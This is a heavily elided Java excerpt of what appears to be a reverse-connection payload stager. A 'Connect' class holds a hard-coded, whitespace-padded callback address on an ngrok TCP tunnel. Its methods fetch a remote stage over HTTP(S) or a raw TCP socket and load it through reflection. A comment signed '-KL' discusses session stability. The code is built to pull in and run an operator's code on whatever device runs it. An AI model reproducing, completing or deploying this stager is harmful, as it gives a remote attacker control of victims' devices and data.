...
public class Connect {
    ...
    public static final String URL = "ZZZZtcp://1.tcp.ngrok.io:24635                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ";
    ...
    private static void runStageFromHTTP(String url) throws Exception {
        ...
        if (url.startsWith("https")) {
            ...
            Class.forName("SecureConnection").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
    ...
    private static void runStagefromTCP(String url) throws Exception {
        ...
        if (sock != null) {
            ...
            // If the value is low, high possibility for app to crush during opening sessions -KL
